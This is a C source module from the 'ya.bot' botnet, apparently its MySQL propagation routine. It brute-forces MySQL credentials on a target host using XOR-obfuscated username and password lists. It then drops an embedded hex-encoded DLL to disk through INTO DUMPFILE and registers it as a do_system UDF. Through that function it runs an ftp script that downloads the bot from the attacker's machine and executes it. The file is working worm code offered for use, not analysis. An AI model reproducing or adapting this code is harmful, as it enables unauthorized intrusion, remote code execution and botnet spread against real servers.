/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANMYUDF
bool expscan_myudf(SExpScanInfo s_esi)
{
	char szFileData[MASBUF] =
			"0x4D5A40000100000002000400FFFF0200400000000E0000001C000000000000000000000000000000000"
			"0000D0A240EB409BA00001FCD21B8014CCD2140000000504500004C010200251E58430000000000000000"
			"E0000E210B0106000000000000040000000000001F1000000010000000100000000000100010000000020"
			"000040000000000000004000000000000000C2000000002000069D7000002000000000010000010000000"
			"00100000100000000000001000000080100000460000002C1000002800000000000000000000000000000"
			"0000000000000000000000000002000000C00000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000001000000800000000000000000000000"
			"00000000000000000000000000000002E646174610000000010000000100000C900000000020000000000"
			"000000000000000000400000C02E72656C6F6300000C000000002000000E0000000004000000000000000"
			"0000000000000400000422E64617461000000C60000000010000000020000000200000000000000000000"
			"00000000400000C02E72656C6F6300000C000000002000000002000000040000000000000000000000000"
			"0004000004200000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000005C100000000000008B442408833801750B8B4008FF30E80B0000005933C0C333C040C20C00CCFF2"
			"5001000105410000000000000000000006610000000100000000000000000000000000000000000000000"
			"00005C10000000000000CD0273797374656D00004D53564352542E646C6C0000000000000000000000000"
			"000000000000000251E584300000000B2100000010000000100000001000000A8100000AC100000B01000"
			"0008100000BC10000000006D797564662E646C6C00646F5F73797374656D0000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000001000000C00000028300000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			"00000000000000";
	char *rgpszLibraryList[] =
	{
			//Australia, Australia
			"http://optusnet.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Asia, Japan
			"http://jaist.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Asia , Japan
			"http://keihanna.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Asia, Taiwan
			"http://nchc.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, France
			"http://ovh.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, Ireland
			"http://heanet.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			 //Europe, Rusisa
			"http://citkit.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, Russia
			"http://peterhost.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, Switzerland
			"http://puzzle.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, Switzerland
			"http://switch.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, The Netherlands
			"http://surfnet.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//Europe, UK
			"http://kent.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//North America, USA
			"http://easynews.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
			//South America, Brazil
			"http://ufpr.dl.sourceforge.net/sourceforge/infiniti/libmysql.dll",
	};
	char szBuffer[sizeof(szFileData) + LOWBUF];
	HMODULE hModule;
	int i = 0, j = 0;
	MYSQL mysql;
	typedef void (WINAPI *pmysql_close)(MYSQL *);
	typedef MYSQL *(WINAPI *pmysql_init)(MYSQL *);
	typedef int (WINAPI *pmysql_query)(MYSQL *, const char *);
	typedef MYSQL *(WINAPI *pmysql_real_connect)(MYSQL *,
			const char *,
			const char *,
			const char *,
			const char *,
			unsigned int,
			const char *,
			const int);
	typedef int (WINAPI *pmysql_real_query)(MYSQL *, const char *, unsigned int);
	pmysql_close mysql_close;
	pmysql_init mysql_init;
	pmysql_query mysql_query;
	pmysql_real_connect mysql_real_connect;
	pmysql_real_query mysql_real_query;

#ifndef NO_DEBUG
		debug_print("Exploit scanning myudf, expscan_myudf()");
#endif

closesocket(s_esi.m_csock);
		srand(GetTickCount());
	if (xURLDownloadToFile(rgpszLibraryList[rand() % ARRAYSIZE(rgpszLibraryList)],
				"libmySQL.dll") != S_OK) return FALSE;
		hModule = LoadLibrary("libmySQL.dll");
	if (!hModule)
			return FALSE;
		mysql_close = (pmysql_close)GetProcAddress(hModule, "mysql_close");
	if (!mysql_close)
			return FALSE;
		mysql_init = (pmysql_init)GetProcAddress(hModule, "mysql_init");
	if (!mysql_init)
			return FALSE;
		mysql_query = (pmysql_query)GetProcAddress(hModule, "mysql_query");
	if (!mysql_query)
			return FALSE;
		mysql_real_connect = (pmysql_real_connect)GetProcAddress(hModule, "mysql_real_connect");
	if (!mysql_real_connect)
			return FALSE;
		mysql_real_query = (pmysql_real_query)GetProcAddress(hModule, "mysql_real_query");
	if (!mysql_real_query)
			return FALSE;
		mysql_init(&mysql);
	while (g_rgpszUsernameList[i])
	{
			crypto_xor(g_rgpszUsernameList[i], xorkey);
		while (g_rgpszPasswordList[j])
		{
				crypto_xor(g_rgpszPasswordList[j], xorkey);
			if (mysql_real_connect(&mysql,
						s_esi.m_szIP,
						g_rgpszUsernameList[i],
						g_rgpszPasswordList[j],
						"mysql",
						s_esi.m_nPort,
						NULL,
						0))
			{
				if (mysql_query(&mysql, "USE mysql") !=0)
						break;
				if (mysql_query(&mysql, "DROP TABLE IF EXISTS szFileData") !=0)
						break;
				if (mysql_query(&mysql,
							"CREATE TABLE szFileData(szFileData blob NOT null) TYPE=MyISAM") !=0)
						break;
					_snprintf(szBuffer, sizeof(szBuffer) - 1,
							"INSERT INTO szFileData (szFileData) VALUES (%s)",
							szFileData);
				if (mysql_real_query(&mysql, szBuffer, strlen(szBuffer)) != 0)
						break;
				if (mysql_query(&mysql,
							"SELECT szFileData FROM szFileData INTO DUMPFILE 'C:\\\\myudf.dll'") !=0)
						break;
				if (mysql_query(&mysql, "DROP TABLE szFileData") !=0 )
						break;
				if (mysql_query(&mysql,
							"CREATE FUNCTION do_system RETURNS INTEGER SONAME 'C:\\\\myudf.dll'") !=0)
						break;
							
#ifndef NO_DAEMONFTP
					_snprintf(szBuffer, sizeof(szBuffer) - 1, "SELECT do_system('"
							"echo open %s %i > temp987.dat&"
							"echo user %s %s >> temp987.dat&"
							"echo get %s C:\\%s >> temp987.dat&"
							"echo quit >> temp987.dat&"
							"ftp -n -s:temp987.dat&"
							"start C:\\%s&"
							"del /Q temp987.dat&"
							"%s"
							"')",
							ip_getip(s_esi.m_bsock),
							daemonftpport, daemonftpuser, daemonftppass,
							botfilename, botfilename, botfilename, botfilename);
				if (mysql_real_query(&mysql, szBuffer, strlen(szBuffer)) != 0)
						break;
#endif

				if (mysql_query(&mysql, "DROP FUNCTION do_system") !=0)
						break;
					mysql_close(&mysql);
					crypto_xor(g_rgpszPasswordList[j], xorkey);
					crypto_xor(g_rgpszUsernameList[i], xorkey);
					return TRUE;
			}
				crypto_xor(g_rgpszPasswordList[j], xorkey);
				j++;
				Sleep(FLOOD_DELAY);
		}
			crypto_xor(g_rgpszUsernameList[i], xorkey);
			i++;
			Sleep(FLOOD_DELAY);
	}
/*	if (mysql_real_connect(&mysql,
				s_esi.m_szIP,
				"root",
				"",
				"mysql",
				s_esi.m_nPort,
				NULL,
				0))
	{
		if (mysql_query(&mysql, "USE mysql") !=0)
				break;
		if (mysql_query(&mysql, "DROP TABLE IF EXISTS szFileData") !=0)
				break;
		if (mysql_query(&mysql,
					"CREATE TABLE szFileData(szFileData blob NOT null) TYPE=MyISAM") !=0)
				break;
			_snprintf(szBuffer, sizeof(szBuffer) - 1,
					"INSERT INTO szFileData (szFileData) VALUES (%s)",
					szFileData);
		if (mysql_real_query(&mysql, szBuffer, strlen(szBuffer)) != 0)
				break;
		if (mysql_query(&mysql,
					"SELECT szFileData FROM szFileData INTO DUMPFILE 'C:\\\\myudf.dll'") !=0)
				break;
		if (mysql_query(&mysql, "DROP TABLE szFileData") !=0 )
				break;
		if (mysql_query(&mysql,
					"CREATE FUNCTION do_system RETURNS INTEGER SONAME 'C:\\\\myudf.dll'") !=0)
				break;
					
#ifndef NO_DAEMONFTP
			_snprintf(szBuffer, sizeof(szBuffer) - 1, "SELECT do_system('"
					"echo open %s %i > temp987.dat&"
					"echo user %s %s >> temp987.dat&"
					"echo get %s C:\\%s >> temp987.dat&"
					"echo quit >> temp987.dat&"
					"ftp -n -s:temp987.dat&"
					"start C:\\%s&"
					"del /Q temp987.dat&"
					"%s"
					"')",
					ip_getip(s_esi.m_bsock),
					daemonftpport, daemonftpuser, daemonftppass,
					botfilename, botfilename, botfilename, botfilename);
		if (mysql_real_query(&mysql, szBuffer, strlen(szBuffer)) != 0)
				break;
#endif

		if (mysql_query(&mysql, "DROP FUNCTION do_system") !=0)
				break;
			mysql_close(&mysql);
			return TRUE;
	}*/
		return FALSE;
}
#endif
#endif